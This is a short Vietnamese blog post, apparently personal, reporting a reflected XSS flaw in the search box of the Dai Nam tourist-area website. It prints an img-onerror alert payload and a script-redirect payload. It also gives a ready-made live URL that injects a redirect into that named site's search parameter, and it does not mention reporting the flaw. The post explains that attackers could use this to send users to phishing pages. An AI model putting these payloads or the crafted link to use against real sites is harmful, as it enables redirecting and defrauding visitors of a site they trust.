---
title: Lỗ hổng XSS của trang web khu du lịch Đại Nam
date: 12/6/2021
layout: single
--- 

---


## Mô Tả 

Dạo này cũng hay coi drama :D nên thử vào xem trang du lịch Đại Nam xem nó như thế nào, tình cờ phát hiện XSS ở ô tìm kiếm chèn thử vài script công nhận nó nguy hiểm thật :D  

--- 

# Demo
## Javascript
![](https://www8.0zz0.com/2021/06/12/18/357532369.png)
---
```js
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
```
Test nhẹ cái script thứ nhất hiển thị alert :D nếu hacker nhúng vào script chuyển hướng tới trang độc hại hoặc lừa đảo thì người dùng có thể bị mắc lừa của hacker, vì người dùng cứ nghĩ rằng đang ở trang chính chủ nhưng không biết đã bị hacker gắn script vào :D

```js
<script>
    window.location.replace("http://"); 
    </script>
```
Script này hacker sử dụng để chuyển hướng người dùng tới một trang web khác
+ [https://khudulichdainam.vn/tim-kiem.html?k=%3Cscript%3E%20window.location.replace(%22http://blogth3pr0.github.io%22);%3C/script%3E](https://khudulichdainam.vn/tim-kiem.html?k=%3Cscript%3E%20window.location.replace(%22http://blogth3pr0.github.io%22);%3C/script%3E) 
---





## Thanks :D
